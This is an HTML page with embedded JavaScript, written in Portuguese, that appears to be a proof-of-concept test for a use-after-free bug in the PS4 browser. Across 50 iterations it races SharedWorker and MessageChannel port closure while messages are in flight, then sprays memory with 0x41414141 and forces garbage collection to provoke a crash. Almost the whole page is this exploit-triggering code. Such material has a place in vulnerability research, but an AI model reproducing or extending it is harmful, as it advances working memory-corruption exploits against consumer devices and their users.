<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 UAF - Teste de Prova Real</title>
    <style>
        body { background-color: #1a1a1a; color: #fff; font-family: sans-serif; font-size: 20px; padding: 20px; }
        #counter { font-size: 80px; font-weight: bold; color: yellow; }
        .log-box { font-size: 14px; color: #aaa; margin-top: 20px; }
    </style>
</head>
<body>

    <h2>UAF Check - Limite 50</h2>
    <p>Se o console desligar antes do contador chegar em 50, é BUG VÁLIDO (UAF).</p>
    <p>Se chegar em 50 e parar, o bug anterior era apenas falta de memória.</p>
    
    <div>Tentativa Atual:</div>
    <div id="counter">0</div>
    
    <br>
    <button onclick="startVerification()" style="padding: 15px 30px; font-size: 20px;">INICIAR VERIFICAÇÃO</button>
    
    <div id="log" class="log-box"></div>

    <script>
        let iteration = 0;
        const MAX_ITERATIONS = 50; // Limite baixo para provar que não é DoS por quantidade

        function log(msg) {
            document.getElementById('log').innerText = msg;
        }

        function updateCounter(val) {
            document.getElementById('counter').innerText = val;
        }

        // Tenta forçar o Garbage Collector criando lixo e descartando
        function forceGC() {
            let a = [];
            for(let i=0; i<1000; i++) a.push(new Uint8Array(1000));
            a = null; 
        }

        async function startVerification() {
            iteration = 0;
            const workerCode = `
                onmessage = (e) => {
                    const p = e.ports[0];
                    const pl = new Uint32Array(32); pl.fill(0x41414141);
                    setInterval(() => { try { p.postMessage(pl); } catch(e){} }, 0);
                }
            `;
            const blobUrl = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));

            log("Iniciando bateria de testes...");

            while(iteration < MAX_ITERATIONS) {
                iteration++;
                updateCounter(iteration);

                // 1. Pausa visual obrigatória para garantir que o número atualize na TV
                await new Promise(r => setTimeout(r, 100));

                // 2. Executa a tentativa de crash
                await runRace(blobUrl);

                // 3. Limpeza agressiva entre tentativas
                forceGC();
                
                // Pausa para o sistema respirar
                await new Promise(r => setTimeout(r, 50));
            }

            log("SUCESSO: O sistema sobreviveu a 50 tentativas. Provavelmente o crash anterior era apenas falta de memória (DoS), não um exploit estável.");
            document.getElementById('counter').style.color = "#00ff00"; // Verde
        }

        function runRace(url) {
            return new Promise((resolve) => {
                const mc = new MessageChannel();
                // Usa nome único para evitar cache do worker
                const sw = new SharedWorker(url, "chk_" + iteration + "_" + Date.now());
                sw.port.start();
                sw.port.postMessage("go", [mc.port2]);

                setTimeout(() => {
                    // O GATILHO
                    sw.port.close();
                    mc.port1.close();
                    
                    // Spray rápido
                    let spray = new Uint32Array(1024);
                    spray.fill(0x41414141);
                    
                    setTimeout(() => {
                        resolve();
                    }, 10); // Janela curta
                }, 2); // Delay fixo de 2ms (ajuste se necessário)
            });
        }
    </script>
</body>
</html>
